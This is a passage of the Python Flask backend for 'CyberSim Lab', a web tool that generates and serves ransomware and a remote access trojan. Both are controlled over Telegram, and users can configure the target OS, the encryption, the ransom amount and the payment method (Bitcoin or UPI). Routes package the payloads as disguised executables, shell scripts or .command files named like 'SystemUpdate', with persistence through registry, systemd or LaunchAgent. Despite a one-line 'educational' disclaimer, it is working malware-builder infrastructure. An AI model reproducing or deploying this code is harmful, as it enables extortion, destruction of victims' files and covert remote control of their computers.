    lines.append({'text': '='*55, 'type': 'system'})
    lines.append({'text': '  GENERATION COMPLETE', 'type': 'system'})
    lines.append({'text': f'  File:       {filename}', 'type': 'output'})
    lines.append({'text': f'  Algorithm:  {algo_name}', 'type': 'output'})
    lines.append({'text': f'  Ransom:     {ransom_amount} {"Rs (INR)" if ransom_method == "upi" else "$"} via {ransom_method.upper()}', 'type': 'output'})
    lines.append({'text': f'  Target:     CWD + Desktop + Documents + Downloads + Pictures', 'type': 'output'})
    lines.append({'text': f'  Token:      {masked_token}', 'type': 'output'})
    lines.append({'text': f'  Commands:   /unlock /status /info /help /stop', 'type': 'output'})
    lines.append({'text': '='*55, 'type': 'system'})
    lines.append({'text': '[+] READY TO DOWNLOAD!', 'type': 'success'})
    lines.append({'text': '', 'type': 'output'})
    lines.append({'text': f'Usage on {os_label}:', 'type': 'info'})
    lines.append({'text': f'  python {filename}              # Normal encrypt', 'type': 'output'})
    lines.append({'text': f'  python {filename} --install    # Full stealth!', 'type': 'output'})
    lines.append({'text': f'  python {filename} --decrypt    # Local decrypt', 'type': 'output'})
    lines.append({'text': f'  python {filename} --uninstall  # Remove all', 'type': 'output'})

    return lines


def gen_rw_report(bot_token, chat_id, target_os, enc_algo, ransom_amount, ransom_method, upi_id='pay@merchant'):
    """Generate text report for ransomware download"""
    masked_token = bot_token[:6] + '***' + bot_token[-4:] if len(bot_token) > 10 else bot_token
    os_labels = {'windows': 'Windows 10/11', 'macos': 'macOS', 'linux': 'Linux (Ubuntu/Kali)'}
    os_label = os_labels.get(target_os, target_os)
    algo_name = 'AES-256' if enc_algo == 'aes' else 'XOR Cipher'
    filenames = {'windows': 'ransomware_win.py', 'linux': 'ransomware_linux.py', 'macos': 'ransomware_mac.py'}
    filename = filenames.get(target_os, 'ransomware.py')

    r = []
    r.append('=' * 60)
    r.append(f'  CyberSim Lab - {os_label} Ransomware v5.0 Generation Report')
    r.append(f'  Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    r.append('=' * 60)
    r.append('')
    r.append(f'  BOT_TOKEN: {masked_token}')
    r.append(f'  CHAT_ID:   {chat_id}')
    r.append(f'  Platform:  {os_label}')
    r.append(f'  Algorithm: {algo_name}')
    r.append(f'  Ransom:    {ransom_amount} {"Rs (INR)" if ransom_method == "upi" else "$"} via {ransom_method.upper()}')
    if upi_id and upi_id != 'pay@merchant':
        r.append(f'  UPI/Wallet: {upi_id}')
    r.append(f'  Version:   v5.0')
    r.append('')
    r.append('  ─── FEATURES ───')
    r.append('  File Encryption:    ' + algo_name + ' on 28+ extensions')
    r.append('  Telegram C2:        /unlock /status /info /help /stop')
    r.append('  Key Storage:        Hidden .syscache directory')
    r.append('  Ransom Note:        README_DECRYPT.html popup on Desktop + per file')
    r.append('  Self-Delete:        Auto-remove after /unlock command')
    r.append('  Victim ID:          Random 8-char hex')
    r.append('  Auto-Deploy Alert:  Telegram on start/encrypt')
    r.append('')
    r.append('  ─── TARGETS ───')
    r.append('  Directories: CWD (where script runs), Desktop, Documents, Downloads, Pictures')
    r.append('  Extensions: .txt .doc .docx .pdf .xls .xlsx .ppt .pptx')
    r.append('               .jpg .jpeg .png .csv .json .xml .zip .rar')
    r.append('               .py .c .cpp .java .html .css .js .sql .db')
    r.append('               .mp3 .mp4 .mkv .avi')
    r.append('')
    r.append('  ─── STEALTH ───')
    if target_os == 'windows':
        r.append('  Persistence: Registry Run + Startup BAT/VBS')
        r.append('  Silent:      pythonw.exe (no window)')
        r.append('  Key Hidden:  %APPDATA%/.syscache/key.dat')
    elif target_os == 'linux':
        r.append('  Persistence: Systemd service + Cron job')
        r.append('  Key Hidden:  /tmp/.syscache/key.dat')
    else:
        r.append('  Persistence: LaunchAgent + Cron job')
        r.append('  Key Hidden:  /tmp/.syscache/key.dat')
    r.append('')
    r.append('  ─── TELEGRAM COMMANDS ───')
    r.append('  /unlock  - Decrypt ALL encrypted files remotely')
    r.append('  /status  - Active status, file count, OS info')
    r.append('  /info    - Full system info (IP, CPU, RAM, disk)')
    r.append('  /help    - List all commands')
    r.append('  /stop    - Stop ransomware process')
    r.append('')
    r.append(f'  Output: {filename}')
    r.append('')
    if target_os == 'windows':
        r.append(f'  Usage: python {filename}')
        r.append(f'         python {filename} --install')
    elif target_os == 'linux':
        r.append(f'  Usage: python3 {filename}')
        r.append(f'         sudo python3 {filename} --install')
    else:
        r.append(f'  Usage: python3 {filename}')
        r.append(f'         python3 {filename} --install')
    r.append('')
    r.append('NOTE: Educational cybersecurity lab only.')
    return '\\n'.join(r)


# ============================================================
# FLASK ROUTES
# ============================================================

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)


@app.route('/api/simulate', methods=['POST'])
def simulate():
    data = request.json
    module = data['module']
    cfg = data['config']

    if module == 'virus':
        lines = gen_virus_lines(cfg)
    else:
        return jsonify({'error': 'Invalid module'}), 400

    report = gen_report(module, cfg, lines)
    return jsonify({'lines': lines, 'report': report})


@app.route('/api/generate_rat', methods=['POST'])
def generate_rat():
    """Generate the real RAT with user's credentials"""
    data = request.json
    bot_token = data.get('bot_token', '').strip()
    chat_id = data.get('chat_id', '').strip()
    target_os = data.get('target_os', 'windows')
    c2_port = data.get('c2_port', '443')

    if not bot_token or not chat_id:
        return jsonify({'error': 'BOT_TOKEN and CHAT_ID required'}), 400

    try:
        # Generate terminal animation lines
        lines = gen_rat_generate_lines(bot_token, chat_id, target_os, c2_port)
        report = gen_rat_report(bot_token, chat_id, target_os, c2_port)

        # Check if client wants the actual file (for download)
        # The JS always expects JSON with lines, download uses separate fetch with blob
        return jsonify({'lines': lines, 'report': report})

    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/download_rat', methods=['POST'])
def download_rat():
    """Download the generated RAT file"""
    data = request.json
    bot_token = data.get('bot_token', '').strip()
    chat_id = data.get('chat_id', '').strip()
    target_os = data.get('target_os', 'windows')
    c2_port = data.get('c2_port', '443')

    if not bot_token or not chat_id:
        return jsonify({'error': 'BOT_TOKEN and CHAT_ID required'}), 400

    filenames = {'windows': 'rat_telegram_win.py', 'macos': 'rat_telegram_mac.py', 'linux': 'rat_telegram_linux.py'}
    filename = filenames.get(target_os, 'rat_telegram.py')

    try:
        if target_os == 'windows':
            code = generate_rat_code(bot_token, chat_id)
        elif target_os == 'macos':
            code = generate_rat_code_macos(bot_token, chat_id, c2_port)
        elif target_os == 'linux':
            code = generate_rat_code_linux(bot_token, chat_id, c2_port)
        else:
            code = generate_rat_code(bot_token, chat_id)

        return app.response_class(
            response=code,
            status=200,
            mimetype='text/x-python',
            headers={'Content-Disposition': f'attachment; filename="{filename}"'}
        )
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/build_binary', methods=['POST'])
def build_binary():
    """Build a standalone binary based on target OS"""
    data = request.json
    bot_token = data.get('bot_token', '').strip()
    chat_id = data.get('chat_id', '').strip()
    fake_name = data.get('fake_name', 'SystemUpdate').strip()
    target_os = data.get('target_os', 'windows')
    c2_port = data.get('c2_port', '443')

    if not bot_token or not chat_id:
        return jsonify({'error': 'BOT_TOKEN and CHAT_ID required'}), 400

    safe_name = ''.join(c for c in fake_name if c.isalnum() or c in ' _-') or 'SystemUpdate'

    try:
        if target_os == 'windows':
            # Windows: Use build_exe_engine (Windows Embeddable Python)
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            from build_exe_engine import build_exe as _build
            rat_code = generate_rat_code(bot_token, chat_id)
            exe_data = _build(rat_code, safe_name)
            tmp_path = os.path.join(tempfile.gettempdir(), safe_name + '.exe')
            with open(tmp_path, 'wb') as f:
                f.write(exe_data)
            return send_file(tmp_path, as_attachment=True, download_name=safe_name + '.exe', mimetype='application/octet-stream')

        elif target_os == 'linux':
            # Linux: Create self-extracting shell script (no PyInstaller needed)
            rat_code = generate_rat_code_linux(bot_token, chat_id, c2_port)
            lines = [
                '#!/bin/bash',
                f'# {safe_name} - Linux (Double-click or run: chmod +x {safe_name}.sh && ./{safe_name}.sh)',
                'cd "$(dirname "$0")"',
                'echo "[*] Installing dependencies..."',
                'pip3 install requests pynput Pillow --break-system-packages 2>/dev/null',
                f'echo "[*] Starting {safe_name}..."',
                f'TMPFILE=$(mktemp /tmp/{safe_name}_XXXXXX.py)',
                "cat > \"$TMPFILE\" << 'PYTHON_EOF'",
                rat_code,
                'PYTHON_EOF',
                'python3 "$TMPFILE" "$@"',
                'rm -f "$TMPFILE"',
            ]
            shell_script = '\n'.join(lines) + '\n'
            tmp_path = os.path.join(tempfile.gettempdir(), safe_name + '.sh')
            with open(tmp_path, 'w') as f:
                f.write(shell_script)
            return send_file(tmp_path, as_attachment=True, download_name=safe_name + '.sh', mimetype='text/x-shellscript')

        elif target_os == 'macos':
            # macOS: Create .command wrapper (double-clickable on macOS)
            rat_code = generate_rat_code_macos(bot_token, chat_id, c2_port)
            lines = [
                '#!/bin/bash',
                f'# {safe_name} - macOS Application (Double-click to run)',
                'cd "$(dirname "$0")"',
                'echo "[*] Installing dependencies..."',
                'pip3 install requests pynput Pillow --break-system-packages 2>/dev/null',
                f'echo "[*] Starting {safe_name}..."',
                f'TMPFILE=$(mktemp /tmp/{safe_name}_XXXXXX.py)',
                "cat > \"$TMPFILE\" << 'PYTHON_EOF'",
                rat_code,
                'PYTHON_EOF',
                'python3 "$TMPFILE" "$@"',
                'rm -f "$TMPFILE"',
            ]
            command_script = '\n'.join(lines) + '\n'
            return app.response_class(
                response=command_script, status=200,
                mimetype='text/x-shellscript',
                headers={'Content-Disposition': f'attachment; filename="{safe_name}.command"'}
            )

        else:
            return jsonify({'error': f'Unsupported OS: {target_os}'}), 400

    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500


@app.route('/api/generate_ransomware', methods=['POST'])
def generate_ransomware():
    """Generate ransomware dashboard lines and report"""
    data = request.json
    bot_token = data.get('bot_token', '').strip()
    chat_id = data.get('chat_id', '').strip()
    target_os = data.get('target_os', 'windows')
    enc_algo = data.get('enc_algo', 'xor')
    ransom_amount = data.get('ransom_amount', '500')
    ransom_method = data.get('ransom_method', 'bitcoin')
    upi_id = data.get('upi_id', 'pay@merchant').strip()
    if not bot_token or not chat_id:
        return jsonify({'error': 'BOT_TOKEN and CHAT_ID required'}), 400
    lines = gen_rw_generate_lines(bot_token, chat_id, target_os, enc_algo, ransom_amount, ransom_method, upi_id)
    report = gen_rw_report(bot_token, chat_id, target_os, enc_algo, ransom_amount, ransom_method, upi_id)
    return jsonify({'lines': lines, 'report': report})


@app.route('/api/download_ransomware', methods=['POST'])
def download_ransomware():
    """Download generated ransomware Python script"""
    data = request.json
    bot_token = data.get('bot_token', '').strip()
    chat_id = data.get('chat_id', '').strip()
    target_os = data.get('target_os', 'windows')
    enc_algo = data.get('enc_algo', 'xor')
    ransom_amount = data.get('ransom_amount', '500')
    ransom_method = data.get('ransom_method', 'bitcoin')
    upi_id = data.get('upi_id', 'pay@merchant').strip()
    if not bot_token or not chat_id:
        return jsonify({'error': 'BOT_TOKEN and CHAT_ID required'}), 400
    filenames = {'windows': 'ransomware_win.py', 'linux': 'ransomware_linux.py', 'macos': 'ransomware_mac.py'}
    filename = filenames.get(target_os, 'ransomware.py')
    code = gen_ransomware_code(bot_token, chat_id, target_os, enc_algo, ransom_amount, ransom_method, upi_id)
    return app.response_class(
        response=code,
        status=200,
        mimetype='text/x-python',
        headers={'Content-Disposition': f'attachment; filename="{filename}"'}
    )


@app.route('/api/build_ransomware_binary', methods=['POST'])
def build_ransomware_binary():
    """Build a standalone ransomware binary based on target OS"""
    data = request.json
    bot_token = data.get('bot_token', '').strip()
    chat_id = data.get('chat_id', '').strip()
    fake_name = data.get('fake_name', 'SystemUpdate').strip()
    target_os = data.get('target_os', 'windows')
    enc_algo = data.get('enc_algo', 'xor')
    ransom_amount = data.get('ransom_amount', '500')
    ransom_method = data.get('ransom_method', 'bitcoin')
    upi_id = data.get('upi_id', 'pay@merchant').strip()

    if not bot_token or not chat_id:
        return jsonify({'error': 'BOT_TOKEN and CHAT_ID required'}), 400

    safe_name = ''.join(c for c in fake_name if c.isalnum() or c in ' _-') or 'SystemUpdate'

    try:
        rw_code = gen_ransomware_code(bot_token, chat_id, target_os, enc_algo, ransom_amount, ransom_method, upi_id)

        if target_os == 'windows':
            # Windows: Use build_exe_engine (Windows Embeddable Python)
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            from build_exe_engine import build_exe as _build
            exe_data = _build(rw_code, safe_name)
            tmp_path = os.path.join(tempfile.gettempdir(), safe_name + '.exe')
            with open(tmp_path, 'wb') as f:
                f.write(exe_data)
            return send_file(tmp_path, as_attachment=True, download_name=safe_name + '.exe', mimetype='application/octet-stream')

        elif target_os == 'linux':
            # Linux: Create self-extracting shell script (no PyInstaller needed)
            lines = [
                '#!/bin/bash',
                f'# {safe_name} - Linux Ransomware (run: chmod +x {safe_name}.sh && ./{safe_name}.sh)',
                'cd "$(dirname "$0")"',
                'echo "[*] Installing dependencies..."',
                'pip3 install requests --break-system-packages 2>/dev/null',
                f'echo "[*] Starting {safe_name}..."',
                f'TMPFILE=$(mktemp /tmp/{safe_name}_XXXXXX.py)',
                "cat > \"$TMPFILE\" << 'PYTHON_EOF'",
                rw_code,
                'PYTHON_EOF',
                'python3 "$TMPFILE" "$@"',
                'rm -f "$TMPFILE"',
            ]
            shell_script = '\n'.join(lines) + '\n'
            tmp_path = os.path.join(tempfile.gettempdir(), safe_name + '.sh')
            with open(tmp_path, 'w') as f:
                f.write(shell_script)
            return send_file(tmp_path, as_attachment=True, download_name=safe_name + '.sh', mimetype='text/x-shellscript')

        elif target_os == 'macos':
            # macOS: Create .command wrapper
            lines = [
                '#!/bin/bash',
                f'# {safe_name} - macOS Application (Double-click to run)',
                'cd "$(dirname "$0")"',
                'echo "[*] Installing dependencies..."',
                'pip3 install requests --break-system-packages 2>/dev/null',
                f'echo "[*] Starting {safe_name}..."',
                f'TMPFILE=$(mktemp /tmp/{safe_name}_XXXXXX.py)',
                "cat > \"$TMPFILE\" << 'PYTHON_EOF'",
                rw_code,
                'PYTHON_EOF',
                'python3 "$TMPFILE" "$@"',
                'rm -f "$TMPFILE"',
            ]
            command_script = '\n'.join(lines) + '\n'
            return app.response_class(
                response=command_script, status=200,
                mimetype='text/x-shellscript',
                headers={'Content-Disposition': f'attachment; filename="{safe_name}.command"'}
            )

        else:
            return jsonify({'error': f'Unsupported OS: {target_os}'}), 400

    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500


@app.route('/api/download', methods=['POST'])
def download():
    data = request.json
    module = data['module']
    cfg = data['config']

    if module == 'virus':
        content = gen_virus_script(cfg)
        filename = f"virus_sim_{cfg['virusType']}.py"
    else:
        return jsonify({'error': 'Invalid module'}), 400

    return app.response_class(
        response=content,
        status=200,
        mimetype='text/x-python',
        headers={'Content-Disposition': f'attachment; filename="{filename}"'}
    )


@app.route('/api/build_virus_binary', methods=['POST'])
def build_virus_binary():
    """Build a standalone virus simulation binary for Windows, Linux, or macOS"""
    data = request.json
    cfg = data.get('config', {})
    target_os = data.get('target_os', 'linux')
    fake_name = data.get('fake_name', 'SystemUpdate').strip()
    safe_name = ''.join(c for c in fake_name if c.isalnum() or c in ' _-') or 'SystemUpdate'
    virus_type = cfg.get('virusType', 'ransomware')

    try:
        py_code = gen_virus_script(cfg)

        if target_os == 'windows':
            # Windows: Use build_exe_engine (Embeddable Python)
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            from build_exe_engine import build_exe as _build
            exe_data = _build(py_code, safe_name)
            tmp_path = os.path.join(tempfile.gettempdir(), safe_name + '.exe')
            with open(tmp_path, 'wb') as f:
                f.write(exe_data)
            return send_file(tmp_path, as_attachment=True, download_name=safe_name + '.exe', mimetype='application/octet-stream')

        elif target_os == 'linux':
            # Linux: Self-extracting shell script
            lines = [
                '#!/bin/bash',
                f'# {safe_name} - CyberSim Lab Virus Simulation ({virus_type}) - Linux',
                'cd "$(dirname "$0")"',
                'echo "[*] Starting virus simulation..."',
                'echo "[*] Checking dependencies..."',
                'pip3 install requests --break-system-packages 2>/dev/null || true',
                f'TMPFILE=$(mktemp /tmp/{safe_name}_XXXXXX.py)',
                "cat > \"$TMPFILE\" << 'PYTHON_EOF'",
                py_code,
                'PYTHON_EOF',
                'python3 "$TMPFILE" "$@"',
                'rm -f "$TMPFILE"',
            ]
            shell_script = '\n'.join(lines) + '\n'
            tmp_path = os.path.join(tempfile.gettempdir(), safe_name + '.sh')
            with open(tmp_path, 'w') as f:
                f.write(shell_script)
            return send_file(tmp_path, as_attachment=True, download_name=safe_name + '.sh', mimetype='text/x-shellscript')

        elif target_os == 'macos':
            # macOS: Self-extracting .command file
            lines = [
                '#!/bin/bash',
                f'# {safe_name} - CyberSim Lab Virus Simulation ({virus_type}) - macOS',
                'cd "$(dirname "$0")"',
                'echo "[*] Starting virus simulation..."',
                'echo "[*] Checking dependencies..."',
                'pip3 install requests --break-system-packages 2>/dev/null || true',
                f'TMPFILE=$(mktemp /tmp/{safe_name}_XXXXXX.py)',
                "cat > \"$TMPFILE\" << 'PYTHON_EOF'",
                py_code,
                'PYTHON_EOF',
                'python3 "$TMPFILE" "$@"',
                'rm -f "$TMPFILE"',
            ]
            command_script = '\n'.join(lines) + '\n'
            tmp_path = os.path.join(tempfile.gettempdir(), safe_name + '.command')
            with open(tmp_path, 'w') as f:
                f.write(command_script)
            return send_file(tmp_path, as_attachment=True, download_name=safe_name + '.command', mimetype='text/x-shellscript')

        else:
            return jsonify({'error': f'Unsupported OS: {target_os}'}), 400

    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500


if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════╗
    ║   CyberSim Lab - Cybersecurity Simulation Lab     ║
    ║   Pure Python + Flask (No Node.js Required)      ║
    ╚══════════════════════════════════════════════════╝

    Open: http://localhost:5001
    """)
    app.run(host='0.0.0.0', port=5001, debug=False, threaded=True)
